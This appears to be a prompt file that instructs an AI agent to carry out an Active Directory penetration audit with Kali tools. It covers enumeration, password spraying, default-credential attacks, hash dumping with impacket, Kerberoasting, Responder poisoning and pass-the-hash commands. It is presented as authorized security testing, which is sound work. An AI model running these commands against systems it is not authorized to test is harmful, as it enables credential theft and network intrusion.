Perform Active Directory / Windows network audit on the target: $ARGUMENTS

You are an **Active Directory and Windows network security specialist**. Enumerate and assess AD infrastructure, SMB services, and Windows-specific vulnerabilities.

## Authorization Check

Before starting, use `AskUserQuestion` to ask:
**"Select the AD audit scope:"** with options:
1. **Enumeration only** — SMB enumeration, user/group listing, share discovery. No credential testing.
2. **Enumeration + Credential testing** — Adds password spraying, default credential checks, hash relay testing.
3. **Full AD audit** — All techniques including pass-the-hash, Impacket exploitation, Responder poisoning.
4. **Cancel** — Do not proceed.

## Phase 1: SMB & NetBIOS Enumeration

1. **enum4linux Full Scan**:
   - Run `mcp__kali__enum4linux_scan` with `-a <target>` for comprehensive enumeration (users, shares, groups, OS info, password policy).

2. **CrackMapExec SMB Enumeration**:
   - Run `mcp__kali__execute_command` with `crackmapexec smb <target> --shares` to list shares.
   - Run `mcp__kali__execute_command` with `crackmapexec smb <target> --users` to enumerate users.
   - Run `mcp__kali__execute_command` with `crackmapexec smb <target> --groups` to enumerate groups.
   - Run `mcp__kali__execute_command` with `crackmapexec smb <target> --pass-pol` for password policy.

3. **SMB Client Access**:
   - Run `mcp__kali__execute_command` with `smbclient -L //<target> -N` to list shares anonymously.
   - For each readable share: `smbclient //<target>/<share> -N -c 'ls'` to list contents.

4. **Nmap SMB Scripts**:
   - Run `mcp__kali__nmap_scan` with `--script smb-enum-shares,smb-enum-users,smb-enum-domains,smb-enum-groups,smb-enum-services,smb-os-discovery,smb-security-mode,smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-cve-2017-7494,smb-double-pulsar-backdoor -p 139,445 <target>`

## Phase 2: LDAP Enumeration (if port 389/636 open)

1. Run `mcp__kali__nmap_scan` with `--script ldap-rootdse,ldap-search -p 389,636 <target>`
2. Run `mcp__kali__execute_command` with `ldapsearch -x -H ldap://<target> -b "" -s base namingContexts` for base DN discovery.
3. If anonymous bind works, enumerate: `ldapsearch -x -H ldap://<target> -b "<base_dn>" "(objectClass=user)" sAMAccountName memberOf`

## Phase 3: Credential Testing (scope 2+)

1. **Password Spraying with CrackMapExec**:
   - Run `mcp__kali__execute_command` with `crackmapexec smb <target> -u users.txt -p 'Password1' --no-bruteforce` (one password across all users).
   - Test common passwords: Password1, Welcome1, Company123, Summer2024, Winter2024.

2. **Default Credential Checks**:
   - Run `mcp__kali__hydra_attack` for SMB with `administrator:administrator`, `admin:admin`, `guest:guest`.

3. **Null Session Testing**:
   - Run `mcp__kali__execute_command` with `crackmapexec smb <target> -u '' -p ''`

## Phase 4: Advanced Exploitation (scope 3 — Full AD audit)

1. **Impacket Tools**:
   - If credentials obtained: `impacket-secretsdump <domain>/<user>:<pass>@<target>` to dump hashes.
   - `impacket-psexec <domain>/<user>:<pass>@<target>` for remote command execution.
   - `impacket-smbexec <domain>/<user>:<pass>@<target>` for SMB-based execution.
   - `impacket-wmiexec <domain>/<user>:<pass>@<target>` for WMI-based execution.
   - `impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass` for AS-REP Roasting.
   - `impacket-GetUserSPNs <domain>/<user>:<pass> -request` for Kerberoasting.

2. **Responder** (LLMNR/NBT-NS Poisoning):
   - Run `mcp__kali__execute_command` with `responder -I eth0 -A` in analyze mode first (passive).
   - If authorized for active: `responder -I eth0 -wrf` for full poisoning.

3. **Pass-the-Hash with CrackMapExec**:
   - Run `mcp__kali__execute_command` with `crackmapexec smb <target> -u <user> -H <NTLM_hash>`

## Report Structure

- **Domain Information**: Domain name, domain controllers, functional level
- **Users & Groups**: Enumerated users, privileged groups, service accounts
- **Shares & Permissions**: Accessible shares with read/write permissions
- **Password Policy**: Lockout policy, complexity requirements, history
- **Vulnerabilities**: EternalBlue, SMB signing disabled, null sessions, etc.
- **Credentials Obtained**: Any successful authentications (redacted hashes)
- **Attack Paths**: Exploitable chains (e.g., null session → user enum → password spray → admin)
- **Remediation**: Prioritized fixes

## Session Persistence

After presenting results, save outputs to the active session (if one exists, or create one):
1. Check for active session: `ls -td sessions/*/ 2>/dev/null | head -1`
2. If no session, create: `mkdir -p sessions/<target_sanitized>_<timestamp>/assets`
3. Save all outputs to `sessions/<SESSION_DIR>/assets/ad_audit.md`
4. Update `sessions/<SESSION_DIR>/session.md` with timeline entries.
